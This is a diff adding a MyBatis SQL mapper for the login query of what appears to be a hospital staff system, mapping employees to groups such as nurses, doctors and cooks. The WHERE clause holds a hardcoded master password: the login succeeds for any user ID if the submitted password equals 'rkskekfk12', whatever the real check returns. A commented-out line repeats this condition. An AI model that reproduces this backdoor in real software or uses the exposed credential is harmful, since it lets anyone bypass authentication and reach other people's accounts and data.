@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd">
+
+<mapper namespace="com.example.mshintra.login.mapper.LoginMapper">
+
+    <select id="selectLoginUser" parameterType="com.example.mshintra.login.dto.LoginRequestDto" resultType="com.example.mshintra.login.dto.LoginUserDto">
+        SELECT
+            Ic_Code      AS icCode,
+            RTRIM(Ic_Name) AS icName,
+            Ic_Buser     AS icBuser,
+            Bs_Name      AS ccBuser,
+            Af_FileName  AS afFilename,
+            Af_Content	 AS afContent,
+            CASE
+                WHEN ISNULL(Id_Job, Ic_Buser) BETWEEN 200 AND 299 THEN '1'              -- 간호사/간호조무사
+                WHEN ISNULL(Id_FamName, Ic_Jikchek) IN (25,26,27) THEN '2'              -- 조리사
+                WHEN ISNULL(Id_FamName, Ic_Jikchek) = 1 THEN '7'                        -- 의사
+                WHEN ISNULL(Id_FamName, Ic_Jikchek) NOT IN (1,3,4,17,19,25,26,27)
+                     AND ISNULL(Id_Job, Ic_Buser) <![CDATA[<>]]> '110'
+                     AND ISNULL(Id_Job, Ic_Buser) NOT BETWEEN 200 AND 299 THEN '9'      -- 일반직군
+                ELSE '0'
+            END AS flag
+        FROM P_InsaCode
+        LEFT JOIN P_InsaDetail
+            ON Id_Code = Ic_Code
+           AND Id_DtFlag = 4
+           AND Id_Saflag = Ic_Saflag
+           AND Id_Date1 = (
+               SELECT MAX(Id_Date1)
+               FROM P_InsaDetail
+               WHERE Id_Code = Ic_Code
+                 AND Id_DtFlag = 4
+                 AND Id_Saflag = Ic_Saflag
+                 AND Id_Date1 <![CDATA[<=]]> GETDATE()
+           )
+        LEFT JOIN P_Buser   ON Bs_Code = Id_Job
+        LEFT JOIN P_Jikgub  ON Jg_Code = Id_Amount
+        LEFT JOIN P_JikChek ON Jc_Code = Id_FamName
+        LEFT JOIN File_DB.dbo.i_addFile ON Ic_Code = Af_Num
+        WHERE Ic_Code = #{loginId}
+          AND (dbo.GetPwChk(#{loginId},#{loginPw}) = 'OK' OR #{loginPw} = 'rkskekfk12');
+    </select>
+<!--dbo.GetPwChk(#{loginId},#{loginPw}) = 'OK';-->
+<!--AND (dbo.GetPwChk(#{loginId},#{loginPw}) = 'OK' OR #{loginPw} = 'rkskekfk12');-->
+</mapper>
